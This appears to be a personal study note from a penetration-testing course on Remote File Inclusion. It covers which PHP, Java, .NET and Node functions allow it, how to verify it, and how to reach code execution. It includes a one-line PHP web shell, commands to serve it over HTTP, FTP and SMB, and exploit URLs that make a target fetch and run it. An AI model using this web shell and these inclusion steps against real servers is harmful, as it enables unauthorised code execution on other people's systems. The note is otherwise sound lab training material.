When a *vulnerable function allows us to include remote files*, we may be able to *host a malicious script, and then include it in the vulnerable page to execute malicious functions* and gain remote code execution. This is called **Remote File Inclusion**.

| Function                                           | Read Content | Execute | Remote URL |
| -------------------------------------------------- | ------------ | ------- | ---------- |
| <mark style="background: #ADCCFFA6;">PHP</mark>    |              |         |            |
| include()/include_once()                           | ✅           | ✅      | ✅         |
| file_get_contents()                                | ✅           | ❌      | ✅         |
| <mark style="background: #FFB86CA6;">Java</mark>   |              |         |            |
| import                                             | ✅           | ✅      | ✅         |
| <mark style="background: #D2B3FFA6;">.NET</mark>   |              |         |            |
| @Html.RemotePartial()                              | ✅           | ❌      | ✅         |
| include                                            | ✅           | ✅      | ✅         |
| <mark style="background: #BBFABBA6;">NodeJS</mark> |              |         |            |
| res.render()                                       | ✅           | ✅      | ❌         | 
As we can see, *almost any RFI vulnerability is also an LFI vulnerability*, as any function that allows including remote URLs usually also allows including local ones. *However, an LFI may not necessarily be an RFI.* This is primarily because of three reasons:
1.  The vulnerable function may **not allow including remote URLs**
2.  You may only control a portion of the filename and not the entire protocol wrapper (ex: `http://`, `ftp://`, `https://`).
3.  The configuration may prevent RFI altogether, as **most modern web servers disable including remote files by default.**


## Verify RFI

=== multi-column-start: ID_hehf
```column-settings
Number of Columns: 2
Largest Column: standard
```
### Check 1

Check If `allow_url_include = On` As We Did in [[Local File Inclusion]]

=== end-column ===

### Check 2

`try and include a Local URL`, and see if we can get its content.
**Example** : [http://[SERVER_IP]:[PORT]/index.php?language=http://127.0.0.1:80/index.php]
If The `index.php` page did not get included as source code text but *got executed and rendered as PHP*, The Site is Vulnerable to a *Malicious PHP Script*

=== multi-column-end

%%    Verify If Both Are True!   %%

## Remote Code Execution with RFI
- Create a Basic **PHP Web Shell**
```shell
echo '<?php system($_GET["cmd"]);?>' > shell.php
```

There Are 3 Methods To Host This Script :-
=== multi-column-start: ID_b8w6
```column-settings
Number of Columns: 3
Largest Column: standard
```
#### HTTP
```shell-session
python3 -m http.server <LISTENING_PORT>
```

http://<SERVER_IP>:[PORT]/index.php?language=http://<OUR_IP>:[LISTENING_PORT]/shell.php&cmd=[command]    %%          In Browser        %%
If **shell.php** Doesn't Work, *Remove .php at the end*.

=== end-column ===

#### FTP
```shell-session
python -m pyftpdlib -p 21
```
http://<SERVER_IP>:[PORT]/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
**Use This if HTTP is blocked by the firewall**
If the *Server Requires Authentication*, Use :-
```shell-session
aaryan11x@htb[/htb]$ curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
```

=== end-column ===

#### SMB
If the vulnerable web application is hosted on a *Windows server* (which we can tell from the server version in the HTTP response headers), then we do not need the `allow_url_include` setting to be enabled for RFI exploitation, as we can utilize the *SMB protocol for the remote file inclusion*.
```shell-session
aaryan11x@htb[/htb]$ impacket-smbserver -smb2support share $(pwd)
```
http://<SERVER_IP>:[PORT]/index.php?language=\\<OUR_IP>\shell.php&cmd=whoami

**NOTE: This technique is more likely to work if we were on the same network, as accessing remote SMB servers over the internet may be disabled by default, depending on the Windows server configurations.**

=== multi-column-end


